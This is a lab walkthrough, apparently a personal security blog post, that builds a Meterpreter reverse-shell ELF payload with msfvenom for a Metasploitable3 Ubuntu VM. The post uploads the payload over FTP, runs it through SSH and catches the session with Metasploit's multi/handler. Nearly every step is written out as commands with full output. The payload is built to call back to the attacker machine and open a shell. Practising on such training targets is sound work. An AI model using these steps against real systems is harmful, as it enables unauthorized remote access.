---
title: Reverse shell - msfvenom
date: 2023-06-18
description: Metasploitable3 (Ubuntu) - Reverse shell - msfvenom
tags: 
    - Metasploitable3 Linux Edition
    - metasploit
    - msfvenom
    - reverse shell
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
toc: false
---

## Target: Metasploitable 3 Linux

## Tool: Metasploit

## Vulnerability: Reverse shell

Reverse shell

Step 1: We will first need to create a payload for our Metasploitable VM.

```shell
[msf](Jobs:0 Agents:0) >> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf
[*] exec: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf

Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: reverse-sh.elf
[msf](Jobs:0 Agents:0) >> 
[msf](Jobs:0 Agents:0) >> file reverse-sh.elf
[*] exec: file reverse-sh.elf

reverse-sh.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
[msf](Jobs:0 Agents:0) >> 
```

Step 2: Place the payload file on the target machine using ftp.

```shell
┌─[parrot@parrot]─[~]
└──╼ $ftp 10.0.2.28
Connected to 10.0.2.28.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.2.28]
Name (10.0.2.28:parrot): vagrant
331 Password required for vagrant
Password: 
230 User vagrant logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put reverse-sh.elf
local: reverse-sh.elf remote: reverse-sh.elf
229 Entering Extended Passive Mode (|||3046|)
ftp: Can't connect to `10.0.2.28:3046': Connection timed out
200 EPRT command successful
150 Opening BINARY mode data connection for reverse-sh.elf
100% |***********************************|   207        1.57 MiB/s    00:00 ETA
226 Transfer complete
207 bytes sent in 00:00 (29.30 KiB/s)
Already connected to 10.0.2.28, use close first.
ftp> ls
200 EPRT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 vagrant  vagrant  86562816 Oct 29  2020 VBoxGuestAdditions.iso
-rw-r--r--   1 vagrant  vagrant       207 Feb 21 03:10 reverse-sh.elf
226 Transfer complete
ftp> by
221 Goodbye.
┌─[parrot@parrot]─[~]
└──╼ $
```

Step 3: Make this file executable on our Metasploitable VM.

```shell
┌─[parrot@parrot]─[~]
└──╼ $ssh vagrant@10.0.2.28
The authenticity of host '10.0.2.28 (10.0.2.28)' can't be established.
ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.28' (ED25519) to the list of known hosts.
vagrant@10.0.2.28's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Wed Feb 21 02:47:29 2024
vagrant@metasploitable3-ub1404:~$ chmod +x reverse-sh.elf
vagrant@metasploitable3-ub1404:~$ ls -al reverse-sh.elf 
-rwxr-xr-x 1 vagrant vagrant 207 Feb 21 03:10 reverse-sh.elf
```

Step 4: Open a new terminal. Establish the listener for the reverse connection which our payload will be sending to our machine.

```shell
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.0.2.16
lhost => 10.0.2.16
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 5555
lport => 5555
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.0.2.16:5555 
[*] Sending stage (1017704 bytes) to 10.0.2.28
[*] Meterpreter session 1 opened (10.0.2.16:5555 -> 10.0.2.28:43945) at 2024-02-21 03:19:30 +0000
```

Step 5: Execute the payload on our target. Navigate back to terminal screen with the established SSH connection. Then, type the following:

```shell
vagrant@metasploitable3-ub1404:~$ ./reverse-sh.elf
```

Step 6: Return to the terminal screen which is running the Metasploit listener. You will see a meterpreter session has started and is now open. We have sucessfully established a stable shell! We can access the shell by typing “shell” into meterpreter. We can return to the Meterpreter interface from the shell by typing “exit” into the shell.

```shell
(Meterpreter 1)(/home/vagrant) > shell
Process 1930 created.
Channel 1 created.

uname -a
Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
whoami
vagrant
id
uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo)

exit
(Meterpreter 1)(/home/vagrant) > 

```
